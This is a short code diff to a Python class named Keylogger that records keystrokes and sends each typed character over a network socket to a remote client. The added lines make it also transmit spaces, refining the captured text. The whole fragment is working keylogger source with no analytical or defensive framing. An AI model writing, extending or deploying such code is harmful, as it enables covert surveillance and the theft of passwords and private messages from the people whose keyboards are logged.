@@ -22,6 +22,8 @@ class Keylogger(threading.Thread):
 
     def log(self, key):
         try:
+            if key == keyboard.Key.space:
+                self.client_socket.send(' '.encode())
             # Send the character over the socket to the client
             if hasattr(key, "char"):
                 self.client_socket.send(str(key.char).encode())
